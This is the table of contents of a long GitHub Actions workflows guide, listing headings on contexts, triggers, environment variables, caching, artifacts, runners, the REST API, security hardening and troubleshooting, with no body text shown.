# GitHub Workflows: Complete Guide

- [GitHub Workflows: Complete Guide](#github-workflows-complete-guide)
  - [Introduction](#introduction)
  - [GitHub Actions VS Code Extension \& Tooling](#github-actions-vs-code-extension--tooling)
    - [Installing and Configuring the Extension](#installing-and-configuring-the-extension)
    - [Features and Benefits](#features-and-benefits)
    - [Using Context IntelliSense](#using-context-intellisense)
    - [Validating Workflows Locally](#validating-workflows-locally)
    - [Troubleshooting Extension Issues](#troubleshooting-extension-issues)
    - [Best Practices for Local Development](#best-practices-for-local-development)
  - [Contextual Information in GitHub Workflows](#contextual-information-in-github-workflows)
    - [1. **github Context**](#1-github-context)
      - [Key Variables in `github` Context](#key-variables-in-github-context)
      - [Example Usage](#example-usage)
    - [2. **env Context**](#2-env-context)
    - [3. **secrets Context**](#3-secrets-context)
    - [4. **job Context**](#4-job-context)
      - [Example](#example)
    - [5. **runner Context**](#5-runner-context)
      - [Example — Runner Information](#example--runner-information)
    - [6. **steps Context**](#6-steps-context)
    - [7. **matrix Context**](#7-matrix-context)
    - [8. **inputs Context**](#8-inputs-context)
    - [9. **needs Context**](#9-needs-context)
    - [10. **strategy Context**](#10-strategy-context)
  - [Context Availability Reference](#context-availability-reference)
    - [Contexts by Workflow Key](#contexts-by-workflow-key)
    - [Contexts by Scope](#contexts-by-scope)
      - [Workflow-Level Contexts](#workflow-level-contexts)
      - [Job-Level Contexts](#job-level-contexts)
      - [Step-Level Contexts](#step-level-contexts)
    - [Usage Examples](#usage-examples)
      - [Example 1: Using Contexts at Workflow Level](#example-1-using-contexts-at-workflow-level)
      - [Example 2: Using Contexts at Job Level](#example-2-using-contexts-at-job-level)
      - [Example 3: Using Contexts at Step Level](#example-3-using-contexts-at-step-level)
      - [Example 4: Cross-Job Context Usage with needs](#example-4-cross-job-context-usage-with-needs)
    - [Important Notes on Context Availability](#important-notes-on-context-availability)
      - [1. Secret Redaction](#1-secret-redaction)
    - [2. Limited Context in Dynamic Action Selection](#2-limited-context-in-dynamic-action-selection)
      - [3. Matrix Context Availability](#3-matrix-context-availability)
      - [4. Passing Context Between Jobs](#4-passing-context-between-jobs)
    - [5. Static vs Runtime Expression Evaluation](#5-static-vs-runtime-expression-evaluation)
    - [6. Secret Leakage Prevention in Expressions](#6-secret-leakage-prevention-in-expressions)
  - [GitHub Workflow File Structure](#github-workflow-file-structure)
    - [1. **Basic Structure**](#1-basic-structure)
    - [2. **name**](#2-name)
    - [3. **on** (Events)](#3-on-events)
      - [Common Trigger Events](#common-trigger-events)
    - [4. **env**](#4-env)
    - [5. **defaults**](#5-defaults)
    - [6. **concurrency**](#6-concurrency)
    - [7. **jobs**](#7-jobs)
      - [Job Properties](#job-properties)
        - [**name**](#name)
        - [**runs-on**](#runs-on)
        - [**environment**](#environment)
        - [**outputs**](#outputs)
        - [**strategy**](#strategy)
        - [**if**](#if)
        - [**steps**](#steps)
    - [8. **Steps**](#8-steps)
      - [Step Properties](#step-properties)
        - [**name** — Step Property](#name--step-property)
        - [**uses**](#uses)
        - [**run**](#run)
        - [**with**](#with)
        - [**env**](#env)
        - [**if** — Step Condition](#if--step-condition)
        - [**id**](#id)
        - [**timeout-minutes**](#timeout-minutes)
        - [**continue-on-error**](#continue-on-error)
    - [9. **Container**](#9-container)
    - [10. **services**](#10-services)
    - [11. **permissions**](#11-permissions)
    - [12. **YAML Anchors and Aliases**](#12-yaml-anchors-and-aliases)
    - [13. **Complete Workflow Example**](#13-complete-workflow-example)
  - [GitHub Workflow Trigger Events](#github-workflow-trigger-events)
    - [Overview of Trigger Events](#overview-of-trigger-events)
    - [1. **push** - Code Push Event](#1-push---code-push-event)
      - [Practical Example](#practical-example)
    - [2. **pull\_request** - Pull Request Event](#2-pull_request---pull-request-event)
      - [PR Event Types](#pr-event-types)
      - [Practical Example — Pull Request Checks](#practical-example--pull-request-checks)
    - [3. **pull\_request\_target** - PR Target Event](#3-pull_request_target---pr-target-event)
    - [4. **workflow\_dispatch** - Manual Trigger](#4-workflow_dispatch---manual-trigger)
      - [Input Types](#input-types)
    - [5. **schedule** - Scheduled Events (Cron)](#5-schedule---scheduled-events-cron)
      - [Cron Syntax Reference](#cron-syntax-reference)
      - [Common Cron Patterns](#common-cron-patterns)
    - [6. **workflow\_run** - Trigger on Another Workflow](#6-workflow_run---trigger-on-another-workflow)
      - [Workflow Run Types](#workflow-run-types)
    - [7. **release** - Release Events](#7-release---release-events)
      - [Release Types](#release-types)
    - [8. **issues** - Issue Events](#8-issues---issue-events)
      - [Issue Types](#issue-types)
    - [9. **issue\_comment** - Issue Comment Events](#9-issue_comment---issue-comment-events)
    - [10. **discussion** - Discussion Events](#10-discussion---discussion-events)
    - [11. **discussion\_comment** - Discussion Comment Events](#11-discussion_comment---discussion-comment-events)
    - [12. **fork** - Repository Fork Event](#12-fork---repository-fork-event)
    - [13. **gollum** - Wiki Changes](#13-gollum---wiki-changes)
    - [14. **watch** - Star/Watch Event](#14-watch---starwatch-event)
    - [15. **create** - Branch/Tag Creation](#15-create---branchtag-creation)
    - [16. **delete** - Branch/Tag Deletion](#16-delete---branchtag-deletion)
    - [17. **public** - Repository Public Event](#17-public---repository-public-event)
    - [18. **push to protected branch** - Protected Branch Push](#18-push-to-protected-branch---protected-branch-push)
    - [19. **repository\_dispatch** - External Trigger via API](#19-repository_dispatch---external-trigger-via-api)
    - [20. **check\_run** - Check Run Events](#20-check_run---check-run-events)
    - [21. **check\_suite** - Check Suite Events](#21-check_suite---check-suite-events)
    - [22. **pull\_request\_review** - PR Review Events](#22-pull_request_review---pr-review-events)
    - [23. **pull\_request\_review\_comment** - PR Review Comment Events](#23-pull_request_review_comment---pr-review-comment-events)
    - [24. **member** - Collaborator Events](#24-member---collaborator-events)
    - [25. **team\_add** - Team Added Event](#25-team_add---team-added-event)
    - [26. **push\_protected\_branch** - Protected Branch Push](#26-push_protected_branch---protected-branch-push)
    - [Complete Example: All Event Types](#complete-example-all-event-types)
    - [Event Availability Summary](#event-availability-summary)
  - [Creating and Using Custom Environment Variables](#creating-and-using-custom-environment-variables)
    - [1. **Workflow-Level Environment Variables**](#1-workflow-level-environment-variables)
      - [Definition and Usage](#definition-and-usage)
      - [With Context Variables](#with-context-variables)
    - [2. **Job-Level Environment Variables**](#2-job-level-environment-variables)
      - [Job-Level Override of Workflow-Level Variables](#job-level-override-of-workflow-level-variables)
    - [3. **Step-Level Environment Variables**](#3-step-level-environment-variables)
      - [Step-Level Override of All Levels](#step-level-override-of-all-levels)
    - [4. **Using Secrets in Environment Variables**](#4-using-secrets-in-environment-variables)
      - [Secret Masking and Redaction](#secret-masking-and-redaction)
    - [5. **Using Contexts and Expressions in Environment Variables**](#5-using-contexts-and-expressions-in-environment-variables)
      - [Using github Context](#using-github-context)
      - [Using runner Context](#using-runner-context)
      - [Using Matrix Context](#using-matrix-context)
    - [6. **Creating Dynamic Environment Variables from Step Outputs**](#6-creating-dynamic-environment-variables-from-step-outputs)
      - [Using GITHUB\_OUTPUT](#using-github_output)
      - [Multiline Environment Variables](#multiline-environment-variables)
    - [7. **Using environment Variables from Previous Jobs**](#7-using-environment-variables-from-previous-jobs)
    - [8. **Environment Variables with Default Values**](#8-environment-variables-with-default-values)
      - [Using Variable Expansion](#using-variable-expansion)
    - [9. **Special Environment Variables**](#9-special-environment-variables)
      - [Special GitHub Environment Variables](#special-github-environment-variables)
      - [GITHUB\_STEP\_SUMMARY — Job Summary Reports](#github_step_summary--job-summary-reports)
      - [RUNNER\_TOOL\_CACHE — Preinstalled Software](#runner_tool_cache--preinstalled-software)
    - [10. **Best Practices for Environment Variables**](#10-best-practices-for-environment-variables)
      - [✓ Do's](#-dos)
      - [✗ Don'ts](#-donts)
    - [11. **Complete Example: Multi-Stage Workflow with Environment Variables**](#11-complete-example-multi-stage-workflow-with-environment-variables)
  - [Default Environment Variables](#default-environment-variables)
    - [Overview of Default Environment Variables](#overview-of-default-environment-variables)
    - [1. **Workflow and Execution Information**](#1-workflow-and-execution-information)
      - [Common Workflow Variables](#common-workflow-variables)
      - [Output Example](#output-example)
      - [Use Case: Creating Unique Build Identifiers](#use-case-creating-unique-build-identifiers)
    - [2. **Repository and Reference Information**](#2-repository-and-reference-information)
      - [Repository Variables](#repository-variables)
      - [Output Example — Context Variables](#output-example--context-variables)
      - [Use Case: Building Docker Images with Semantic Tags](#use-case-building-docker-images-with-semantic-tags)
    - [3. **Branch and Pull Request Information**](#3-branch-and-pull-request-information)
      - [Pull Request Variables](#pull-request-variables)
      - [Use Case: Version Control for Feature Branches](#use-case-version-control-for-feature-branches)
    - [4. **File Path and Workspace Variables**](#4-file-path-and-workspace-variables)
      - [Path Variables](#path-variables)
      - [Output Example (Ubuntu)](#output-example-ubuntu)
      - [Use Case: Temporary File Storage and Cleanup](#use-case-temporary-file-storage-and-cleanup)
    - [5. **Runner Information Variables**](#5-runner-information-variables)
      - [Runner Variables](#runner-variables)
      - [Output Examples](#output-examples)
      - [Use Case: OS-Specific Configuration](#use-case-os-specific-configuration)
    - [6. **GitHub API and Token Variables**](#6-github-api-and-token-variables)
      - [API and Token Variables](#api-and-token-variables)
      - [URLs Example](#urls-example)
      - [Output Example — GitHub API URLs](#output-example--github-api-urls)
    - [7. **Event Payload Information**](#7-event-payload-information)
      - [Event Payload Access](#event-payload-access)
      - [Use Case: Extract Commit Message](#use-case-extract-commit-message)
    - [8. **CI Environment Flag**](#8-ci-environment-flag)
      - [CI Variable Usage](#ci-variable-usage)
      - [Use Case: Conditional Build Configuration](#use-case-conditional-build-configuration)
    - [9. **Debug Mode**](#9-debug-mode)
      - [Enabling Debug Logging](#enabling-debug-logging)
      - [Use Case: Troubleshooting](#use-case-troubleshooting)
    - [10. **Complete Reference Table**](#10-complete-reference-table)
    - [11. **Complete Practical Example**](#11-complete-practical-example)
  - [Environment Protection Rules](#environment-protection-rules)
    - [Overview of Environment Protection Rules](#overview-of-environment-protection-rules)
    - [1. **Required Reviewers**](#1-required-reviewers)
      - [Configuration in Repository Settings](#configuration-in-repository-settings)
      - [Workflow Implementation](#workflow-implementation)
      - [How It Works](#how-it-works)
      - [Example: Multi-Reviewer Approval Process](#example-multi-reviewer-approval-process)
    - [2. **Deployment Branches**](#2-deployment-branches)
      - [Configuration Options](#configuration-options)
        - [Protected Branches Only](#protected-branches-only)
        - [Specific Branches](#specific-branches)
      - [Example Workflow](#example-workflow)
      - [Use Case: Different Strategies for Different Branches](#use-case-different-strategies-for-different-branches)
    - [3. **Wait Timer**](#3-wait-timer)
      - [Configuration](#configuration)
      - [Example: 24-Hour Wait Timer for Production](#example-24-hour-wait-timer-for-production)
      - [Use Case: Staggered Deployment Strategy](#use-case-staggered-deployment-strategy)
    - [4. **Custom Deployment Protection Rules**](#4-custom-deployment-protection-rules)
      - [Example: Automated Approval Based on Test Results](#example-automated-approval-based-on-test-results)
    - [5. **Complete Example: Multi-Environment Protection Strategy**](#5-complete-example-multi-environment-protection-strategy)
    - [6. **Best Practices for Environment Protection Rules**](#6-best-practices-for-environment-protection-rules)
      - [✓ Recommended Practices](#-recommended-practices)
      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid)
    - [7. **Testing Protection Rules**](#7-testing-protection-rules)
    - [8. **Monitoring and Auditing Deployments**](#8-monitoring-and-auditing-deployments)
    - [9. **Advanced Environment Protections**](#9-advanced-environment-protections)
      - [Deployment Branches and Restrictions](#deployment-branches-and-restrictions)
      - [Required Reviewers with Role-Based Access](#required-reviewers-with-role-based-access)
      - [Custom Deployment Scripts with Approval Gates](#custom-deployment-scripts-with-approval-gates)
      - [Approval Timeout and Wait Timers](#approval-timeout-and-wait-timers)
      - [Environment Secrets with Restricted Scope](#environment-secrets-with-restricted-scope)
      - [Deployment Status Checks and CI Requirements](#deployment-status-checks-and-ci-requirements)
      - [Monitoring Sensitive Deployments](#monitoring-sensitive-deployments)
  - [GitHub Workflow Artifacts](#github-workflow-artifacts)
    - [Overview of GitHub Artifacts](#overview-of-github-artifacts)
    - [Why Use Artifacts](#why-use-artifacts)
    - [1. **Uploading Artifacts**](#1-uploading-artifacts)
      - [Basic Upload](#basic-upload)
      - [Upload Multiple Files](#upload-multiple-files)
      - [Upload with Patterns](#upload-with-patterns)
      - [Upload with Retention](#upload-with-retention)
    - [2. **Downloading Artifacts**](#2-downloading-artifacts)
      - [Download in Same Workflow](#download-in-same-workflow)
      - [Download All Artifacts](#download-all-artifacts)
      - [Download Across Workflows](#download-across-workflows)
    - [3. **Practical Example: Build, Test, and Deploy**](#3-practical-example-build-test-and-deploy)
    - [4. **Artifact Storage and Limits**](#4-artifact-storage-and-limits)
      - [Storage Limits](#storage-limits)
      - [Retention Policy](#retention-policy)
    - [5. **Advanced Artifact Usage**](#5-advanced-artifact-usage)
      - [Conditional Artifact Upload](#conditional-artifact-upload)
      - [Merging Multiple Artifacts](#merging-multiple-artifacts)
      - [Artifact with Metadata](#artifact-with-metadata)
    - [6. **Using Artifacts for Releases**](#6-using-artifacts-for-releases)
    - [7. **Best Practices for Artifacts**](#7-best-practices-for-artifacts)
      - [✓ Recommended Practices — Artifacts](#-recommended-practices--artifacts)
      - [✗ Anti-Patterns to Avoid — Artifacts](#-anti-patterns-to-avoid--artifacts)
    - [8. **Troubleshooting Artifacts**](#8-troubleshooting-artifacts)
      - [Artifact Not Found](#artifact-not-found)
      - [Storage Quota Exceeded](#storage-quota-exceeded)
      - [Large File Size](#large-file-size)
  - [GitHub Workflow Caching](#github-workflow-caching)
    - [What is Workflow Caching](#what-is-workflow-caching)
    - [Why Use Caching](#why-use-caching)
    - [How Caching Works](#how-caching-works)
    - [1. **Basic Caching**](#1-basic-caching)
      - [Caching Dependencies](#caching-dependencies)
      - [How This Works](#how-this-works)
      - [Check if Cache Hit Occurred](#check-if-cache-hit-occurred)
    - [2. **Multiple Cache Paths**](#2-multiple-cache-paths)
    - [3. **Language-Specific Caching**](#3-language-specific-caching)
      - [Node.js / npm / yarn](#nodejs--npm--yarn)
      - [Python / pip](#python--pip)
      - [Java / Maven](#java--maven)
      - [Java / Gradle](#java--gradle)
      - [Ruby / Bundler](#ruby--bundler)
    - [4. **Practical Full CI Pipeline with Caching**](#4-practical-full-ci-pipeline-with-caching)
    - [5. **Advanced Caching Strategies**](#5-advanced-caching-strategies)
      - [Restore Multiple Cache Keys in Order](#restore-multiple-cache-keys-in-order)
      - [Cache with Conditional Logic](#cache-with-conditional-logic)
      - [Clearing Cache When Needed](#clearing-cache-when-needed)
    - [6. **Caching Best Practices**](#6-caching-best-practices)
      - [✓ Recommended Practices — Caching](#-recommended-practices--caching)
      - [✗ Anti-Patterns to Avoid — Caching](#-anti-patterns-to-avoid--caching)
    - [7. **Troubleshooting Caching**](#7-troubleshooting-caching)
      - [Cache Not Being Used](#cache-not-being-used)
      - [Cache Size Growing Too Large](#cache-size-growing-too-large)
  - [Workflow Sharing](#workflow-sharing)
    - [What is Workflow Sharing](#what-is-workflow-sharing)
    - [Why Share Workflows](#why-share-workflows)
    - [How Workflow Sharing Works](#how-workflow-sharing-works)
    - [1. **Reusable Workflows**](#1-reusable-workflows)
      - [Creating a Reusable Workflow](#creating-a-reusable-workflow)
      - [Using a Reusable Workflow](#using-a-reusable-workflow)
      - [Key Components](#key-components)
    - [2. **Complete Reusable Workflow Examples**](#2-complete-reusable-workflow-examples)
      - [Build and Push Docker Image (Reusable)](#build-and-push-docker-image-reusable)
      - [Code Quality Check (Reusable)](#code-quality-check-reusable)
    - [3. **Calling Reusable Workflows from Other Workflows**](#3-calling-reusable-workflows-from-other-workflows)
    - [4. **Creating Shared Actions**](#4-creating-shared-actions)
      - [Composite Action Example](#composite-action-example)
    - [5. **Best Practices for Workflow Sharing**](#5-best-practices-for-workflow-sharing)
      - [✓ Recommended Practices — Workflow Sharing](#-recommended-practices--workflow-sharing)
      - [✗ Anti-Patterns to Avoid — Workflow Sharing](#-anti-patterns-to-avoid--workflow-sharing)
    - [6. **Starter Workflows**](#6-starter-workflows)
      - [Creating an Organization Starter Workflow](#creating-an-organization-starter-workflow)
      - [Template Placeholder Variables](#template-placeholder-variables)
      - [Organizational Workflow Templates vs GitHub-Provided Starter Workflows](#organizational-workflow-templates-vs-github-provided-starter-workflows)
      - [Access and Permission Model for Non-Public Org Templates](#access-and-permission-model-for-non-public-org-templates)
      - [Disabling vs Deleting a Workflow](#disabling-vs-deleting-a-workflow)
    - [7. **Workflow Status Badges**](#7-workflow-status-badges)
  - [Workflow Debugging](#workflow-debugging)
    - [What is Workflow Debugging](#what-is-workflow-debugging)
    - [Why Debug Workflows](#why-debug-workflows)
    - [How Debugging Works](#how-debugging-works)
    - [1. **Understanding Workflow Logs**](#1-understanding-workflow-logs)
      - [Accessing Workflow Logs](#accessing-workflow-logs)
      - [Environment Information in Logs](#environment-information-in-logs)
    - [2. **Enabling Debug Logging**](#2-enabling-debug-logging)
      - [RUNNER\_DEBUG Variable](#runner_debug-variable)
      - [Output with RUNNER\_DEBUG](#output-with-runner_debug)
    - [3. **Using Workflow Commands**](#3-using-workflow-commands)
      - [Add Diagnostic Markers](#add-diagnostic-markers)
      - [Output Variables for Debugging](#output-variables-for-debugging)
      - [Grouping Output](#grouping-output)
    - [4. **Common Debugging Scenarios**](#4-common-debugging-scenarios)
      - [Scenario 1: Authentication Failures](#scenario-1-authentication-failures)
      - [Scenario 2: Dependency Issues](#scenario-2-dependency-issues)
      - [Scenario 3: Timeout Issues](#scenario-3-timeout-issues)
      - [Scenario 4: Matrix Selective Reruns](#scenario-4-matrix-selective-reruns)
    - [5. **Performance and Profiling**](#5-performance-and-profiling)
      - [Identify Slow Steps](#identify-slow-steps)
      - [Cache Hit Analysis](#cache-hit-analysis)
    - [6. **Debugging Common Failures**](#6-debugging-common-failures)
      - [File Not Found Error](#file-not-found-error)
      - [Environment Variable Issues](#environment-variable-issues)
    - [7. **Best Practices for Debugging**](#7-best-practices-for-debugging)
      - [✓ Recommended Practices — Debugging](#-recommended-practices--debugging)
      - [✗ Anti-Patterns to Avoid — Runner Debugging](#-anti-patterns-to-avoid--runner-debugging)
    - [8. **Advanced Debugging Techniques**](#8-advanced-debugging-techniques)
      - [Real-time Log Streaming](#real-time-log-streaming)
      - [Conditional Debugging](#conditional-debugging)
      - [Artifact Collection for Analysis](#artifact-collection-for-analysis)
  - [GitHub Workflows REST API](#github-workflows-rest-api)
    - [What is the GitHub Workflows REST API](#what-is-the-github-workflows-rest-api)
    - [Why Use the Workflows REST API](#why-use-the-workflows-rest-api)
    - [How the REST API Works](#how-the-rest-api-works)
    - [1. **List Workflows**](#1-list-workflows)
      - [Using in a Script](#using-in-a-script)
    - [2. **Get Workflow Details**](#2-get-workflow-details)
    - [3. **List Workflow Runs**](#3-list-workflow-runs)
      - [Example: Get Recent Failed Runs](#example-get-recent-failed-runs)
      - [Query Parameters](#query-parameters)
    - [4. **Get Workflow Run Details**](#4-get-workflow-run-details)
      - [Complete Python Example](#complete-python-example)
    - [5. **Trigger Workflow (workflow\_dispatch)**](#5-trigger-workflow-workflow_dispatch)
      - [Workflow with Inputs](#workflow-with-inputs)
      - [Python Example: Trigger Deployment](#python-example-trigger-deployment)
    - [6. **Re-run Workflow**](#6-re-run-workflow)
      - [Script: Re-run Failed Workflows](#script-re-run-failed-workflows)
    - [7. **Cancel Workflow Run**](#7-cancel-workflow-run)
    - [8. **Delete Workflow Run**](#8-delete-workflow-run)
    - [9. **List Jobs in a Workflow Run**](#9-list-jobs-in-a-workflow-run)
    - [10. **Get Job Logs**](#10-get-job-logs)
    - [11. **List Artifacts**](#11-list-artifacts)
      - [Clean Up Old Artifacts](#clean-up-old-artifacts)
    - [12. **Best Practices for REST API Usage**](#12-best-practices-for-rest-api-usage)
      - [✓ Recommended Practices — REST API Usage](#-recommended-practices--rest-api-usage)
      - [✗ Anti-Patterns to Avoid — REST API Usage](#-anti-patterns-to-avoid--rest-api-usage)
    - [13. **API Rate Limits and Quotas**](#13-api-rate-limits-and-quotas)
      - [Check Rate Limit Status](#check-rate-limit-status)
      - [Handle Rate Limit Errors](#handle-rate-limit-errors)
  - [Reviewing Deployments](#reviewing-deployments)
    - [What is Deployment Review](#what-is-deployment-review)
    - [Why Review Deployments](#why-review-deployments)
    - [How Deployment Review Works](#how-deployment-review-works)
    - [1. **Configuring Environment for Review**](#1-configuring-environment-for-review)
    - [2. **Review Process**](#2-review-process)
      - [Step 1: Workflow Pauses for Review](#step-1-workflow-pauses-for-review)
      - [Step 2: Reviewer Examines Deployment](#step-2-reviewer-examines-deployment)
      - [Step 3: Reviewer Action](#step-3-reviewer-action)
    - [3. **Complete Deployment Review Workflow**](#3-complete-deployment-review-workflow)
    - [4. **Reviewing Deployment Best Practices**](#4-reviewing-deployment-best-practices)
      - [✓ Recommended Practices — Deployment Review](#-recommended-practices--deployment-review)
      - [✗ Anti-Patterns to Avoid — Deployment Review](#-anti-patterns-to-avoid--deployment-review)
    - [5. **Monitoring Reviewed Deployments**](#5-monitoring-reviewed-deployments)
  - [Creating and Publishing Actions](#creating-and-publishing-actions)
    - [What are GitHub Actions](#what-are-github-actions)
    - [Why Create Custom Actions](#why-create-custom-actions)
    - [How Actions Work](#how-actions-work)
    - [1. **Creating a JavaScript Action**](#1-creating-a-javascript-action)
      - [package.json](#packagejson)
    - [2. **Using Your JavaScript Action**](#2-using-your-javascript-action)
    - [3. **Creating a Composite Action**](#3-creating-a-composite-action)
    - [4. **Publishing Action to Marketplace**](#4-publishing-action-to-marketplace)
      - [README.md Template](#readmemd-template)
  - [License](#license)
    - [4. **Action Versioning \& Release Strategies**](#4-action-versioning--release-strategies)
      - [Semantic Versioning for Actions](#semantic-versioning-for-actions)
      - [Major Version Tag Strategy](#major-version-tag-strategy)
      - [Release Checklist](#release-checklist)
      - [Deprecation and Migration Guide](#deprecation-and-migration-guide)
    - [After (v2)](#after-v2)
  - [Support Timeline](#support-timeline)
      - [Publishing Release Notes](#publishing-release-notes)
    - [4.5 **Action Distribution Models**](#45-action-distribution-models)
      - [Distribution Models Comparison](#distribution-models-comparison)
      - [Public Repository Model](#public-repository-model)
      - [Private Repository Model](#private-repository-model)
      - [GitHub Marketplace Model](#github-marketplace-model)
      - [Private Marketplace Model (Enterprise)](#private-marketplace-model-enterprise)
      - [Comparison: When to Use Each Model](#comparison-when-to-use-each-model)
      - [Migration Path Example](#migration-path-example)
    - [5. **Best Practices for Actions**](#5-best-practices-for-actions)
      - [✓ Recommended Practices](#-recommended-practices-1)
      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-1)
    - [6. **Debugging and Troubleshooting Actions**](#6-debugging-and-troubleshooting-actions)
      - [Enabling Debug Logging](#enabling-debug-logging-1)
      - [Debugging JavaScript Actions](#debugging-javascript-actions)
      - [Debugging Docker Container Actions](#debugging-docker-container-actions)
      - [Debugging Composite Actions](#debugging-composite-actions)
      - [Common Action Failure Patterns](#common-action-failure-patterns)
    - [7. **Using Workflow Commands Inside Custom Actions**](#7-using-workflow-commands-inside-custom-actions)
      - [Workflow Command Reference](#workflow-command-reference)
      - [Using Workflow Commands in Composite Actions](#using-workflow-commands-in-composite-actions)
      - [Using Workflow Commands in JavaScript Actions](#using-workflow-commands-in-javascript-actions)
      - [Accessing Action Outputs in the Calling Workflow](#accessing-action-outputs-in-the-calling-workflow)
  - [Managing Runners](#managing-runners)
    - [What are Runners](#what-are-runners)
    - [Why Manage Runners](#why-manage-runners)
    - [How Runners Work](#how-runners-work)
    - [1. **Understanding Hosted Runners**](#1-understanding-hosted-runners)
    - [2. **Setting Up Self-Hosted Runners**](#2-setting-up-self-hosted-runners)
    - [3. **Using Self-Hosted Runners in Workflows**](#3-using-self-hosted-runners-in-workflows)
    - [4. **Managing Self-Hosted Runners via API**](#4-managing-self-hosted-runners-via-api)
    - [5. **Runner Labels and Organization**](#5-runner-labels-and-organization)
    - [6. **Scaling and Monitoring Runners**](#6-scaling-and-monitoring-runners)
    - [7. **Runner Maintenance and Updates**](#7-runner-maintenance-and-updates)
    - [8. **Best Practices for Runner Management**](#8-best-practices-for-runner-management)
      - [✓ Recommended Practices](#-recommended-practices-2)
      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-2)
  - [GitHub Actions for the Enterprise](#github-actions-for-the-enterprise)
    - [Overview](#overview)
    - [1. **Organizational Use Policies**](#1-organizational-use-policies)
    - [2. **Controlling Access to Actions and Workflows Within an Enterprise**](#2-controlling-access-to-actions-and-workflows-within-an-enterprise)
      - [Fork-Specific Workflow Policies](#fork-specific-workflow-policies)
    - [3. **Runner Groups**](#3-runner-groups)
    - [4. **IP Allow Lists**](#4-ip-allow-lists)
    - [5. **Preinstalled Software on GitHub-Hosted Runners**](#5-preinstalled-software-on-github-hosted-runners)
    - [6. **Secrets and Variables at Organization, Repository, and Environment Levels**](#6-secrets-and-variables-at-organization-repository-and-environment-levels)
      - [Comprehensive REST API CRUD Examples for Secrets \& Variables](#comprehensive-rest-api-crud-examples-for-secrets--variables)
    - [7. **Audit Logging for Actions Events**](#7-audit-logging-for-actions-events)
      - [Accessing the Audit Log](#accessing-the-audit-log)
      - [Key Actions Audit Log Event Types](#key-actions-audit-log-event-types)
      - [Streaming Audit Logs (Enterprise Cloud)](#streaming-audit-logs-enterprise-cloud)
  - [Security and Optimization](#security-and-optimization)
    - [Overview](#overview-1)
    - [1. **GITHUB\_TOKEN — Lifecycle, Permissions, and Granular Scopes**](#1-github_token--lifecycle-permissions-and-granular-scopes)
    - [2. **OIDC Token for Cloud Federation**](#2-oidc-token-for-cloud-federation)
      - [GCP Workload Identity Federation Example](#gcp-workload-identity-federation-example)
      - [Azure Federated Credentials Setup (Detailed)](#azure-federated-credentials-setup-detailed)
      - [OIDC Subject Claim (sub) Specification](#oidc-subject-claim-sub-specification)
    - [3. **Pinning Actions to Full Commit SHAs**](#3-pinning-actions-to-full-commit-shas)
      - [Action Registry Sources](#action-registry-sources)
    - [4. **Script Injection Mitigation**](#4-script-injection-mitigation)
      - [Shell-Specific Quoting Rules](#shell-specific-quoting-rules)
      - [Advanced Pattern: Sanitization Functions](#advanced-pattern-sanitization-functions)
      - [Common Injection Payloads to Test Against](#common-injection-payloads-to-test-against)
    - [5. **Identifying Trustworthy Marketplace Actions**](#5-identifying-trustworthy-marketplace-actions)
      - [Action Trust Assessment Framework](#action-trust-assessment-framework)
      - [Comprehensive Trust Checklist](#comprehensive-trust-checklist)
      - [Trust Assessment Workflow](#trust-assessment-workflow)
      - [Real-World Assessment Example](#real-world-assessment-example)
      - [Trustworthy Action Examples](#trustworthy-action-examples)
      - [Alternative: Custom Action Policy](#alternative-custom-action-policy)
      - [Pinning Strategy by Trust Tier](#pinning-strategy-by-trust-tier)
    - [6. **Artifact Attestations and SLSA Provenance**](#6-artifact-attestations-and-slsa-provenance)
    - [7. **Dependency Policy: Caching and Artifact Retention**](#7-dependency-policy-caching-and-artifact-retention)
  - [Common Failures and Troubleshooting](#common-failures-and-troubleshooting)
    - [1. **Authentication Errors**](#1-authentication-errors)
      - [Problem: Permission Denied](#problem-permission-denied)
      - [Causes — Authentication Errors](#causes--authentication-errors)
      - [Solutions — Authentication Errors](#solutions--authentication-errors)
    - [2. **Dependency Installation Failures**](#2-dependency-installation-failures)
      - [Problem: `npm ci` fails with version conflicts](#problem-npm-ci-fails-with-version-conflicts)
      - [Causes — Dependency Installation](#causes--dependency-installation)
      - [Solutions — Dependency Installation](#solutions--dependency-installation)
    - [3. **Timeout Errors**](#3-timeout-errors)
      - [Problem: Job times out](#problem-job-times-out)
      - [Causes — Job Timeout](#causes--job-timeout)
      - [Solutions — Job Timeout](#solutions--job-timeout)
    - [4. **Workflow File Syntax Errors**](#4-workflow-file-syntax-errors)
      - [Problem: Workflow doesn't trigger or shows validation error](#problem-workflow-doesnt-trigger-or-shows-validation-error)
      - [Causes — Workflow Syntax Errors](#causes--workflow-syntax-errors)
      - [Solutions — Workflow Syntax Errors](#solutions--workflow-syntax-errors)
    - [5. **Runner Issues**](#5-runner-issues)
      - [Problem: `ubuntu-latest` runner has outdated software](#problem-ubuntu-latest-runner-has-outdated-software)
      - [Causes — Runner Outdated Software](#causes--runner-outdated-software)
      - [Solutions — Runner Outdated Software](#solutions--runner-outdated-software)
      - [Problem: Self-hosted runner is offline or not picking up jobs](#problem-self-hosted-runner-is-offline-or-not-picking-up-jobs)
      - [Problem: Jobs are queued but no runner picks them up (label mismatch)](#problem-jobs-are-queued-but-no-runner-picks-them-up-label-mismatch)
      - [Problem: Self-hosted runner fails with permission errors or environment issues](#problem-self-hosted-runner-fails-with-permission-errors-or-environment-issues)
    - [6. **Artifact and Caching Issues**](#6-artifact-and-caching-issues)
      - [Problem: Artifact not found when downloading](#problem-artifact-not-found-when-downloading)
      - [Causes — Artifact Download](#causes--artifact-download)
      - [Solutions — Artifact Download](#solutions--artifact-download)
    - [7. **Matrix Build Failures**](#7-matrix-build-failures)
      - [Problem: One matrix combination fails and stops all others](#problem-one-matrix-combination-fails-and-stops-all-others)
      - [Causes — Matrix Build](#causes--matrix-build)
      - [Solutions — Matrix Build](#solutions--matrix-build)
    - [8. **Secret Management Issues**](#8-secret-management-issues)
      - [Problem: Secret is redacted/not available](#problem-secret-is-redactednot-available)
      - [Causes — Secret Management](#causes--secret-management)
      - [Solutions — Secret Management](#solutions--secret-management)
    - [9. **Step Output Issues**](#9-step-output-issues)
      - [Problem: Cannot reference step output in next step](#problem-cannot-reference-step-output-in-next-step)
      - [Causes — Step Output](#causes--step-output)
      - [Solutions — Step Output](#solutions--step-output)
    - [10. **Performance Issues**](#10-performance-issues)
      - [Problem: Workflows run slowly](#problem-workflows-run-slowly)
      - [Causes — Performance](#causes--performance)
      - [Solutions — Performance](#solutions--performance)
